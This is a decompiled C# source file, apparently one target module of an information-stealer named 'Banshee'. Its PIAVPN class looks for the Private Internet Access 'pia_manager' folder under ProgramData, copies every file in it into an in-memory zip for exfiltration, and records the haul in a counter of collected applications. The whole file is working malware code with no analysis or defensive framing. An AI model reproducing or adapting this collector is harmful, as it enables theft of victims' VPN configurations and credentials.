﻿using System;
using System.IO;
using Banshee.Helper.Data;

namespace Banshee.Targets.Vpn
{
	// Token: 0x02000032 RID: 50
	public class PIAVPN : ITarget
	{
		// Token: 0x06000068 RID: 104 RVA: 0x00004328 File Offset: 0x00004328
		public void Collect(InMemoryZip zip, Counter counter)
		{
			string text = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData), "pia_manager");
			if (Directory.Exists(text))
			{
				Counter.CounterApplications counterApplications = new Counter.CounterApplications();
				counterApplications.Name = "PIA";
				string text2 = ZipPath.Vpn("PIAVPN");
				zip.AddDirectoryFiles(text, text2, true);
				counterApplications.Files.Add(text + " => " + text2);
				counterApplications.Files.Add(text2 + "\\");
				counter.Vpns.Add(counterApplications);
			}
		}
	}
}
